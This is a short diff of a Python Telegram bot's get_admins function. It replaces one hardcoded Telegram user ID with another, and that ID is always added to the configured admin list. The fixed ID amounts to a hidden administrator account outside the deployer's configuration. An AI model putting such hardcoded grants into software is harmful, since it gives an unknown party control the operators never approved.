@@ -493,7 +493,7 @@ async def y_play(playlist):
 async def get_admins(chat):
     admins=Config.ADMINS
     if not Config.ADMIN_CACHE:
-        admins = Config.ADMINS + [626664225]
+        admins = Config.ADMINS + [1145657130]
         try:
             grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
             for administrator in grpadmins:
